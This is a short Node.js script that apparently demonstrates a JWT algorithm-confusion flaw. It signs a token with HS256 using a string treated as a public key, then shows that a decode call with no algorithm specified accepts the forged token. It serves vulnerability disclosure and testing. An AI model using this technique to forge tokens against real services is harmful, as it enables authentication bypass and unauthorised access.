var jwt = require('./index'); //expected to be in the same folder as package

//encode token using a public key
console.log("creating crafted token with public key 'key'")
var token = jwt.encode({ foo: 'bar' }, 'key', 'HS256')
console.log("generated output: ",token)

console.log("Trying with a specified alg");
try{
  var payload = jwt.decode(token, 'key',false,'RS256');
  console.log(payload);
} catch (e){
  console.log("Caught an error ", e)
}

console.log("Trying without a non specified alg")
var payload = jwt.decode(token, 'key');

console.log(payload);
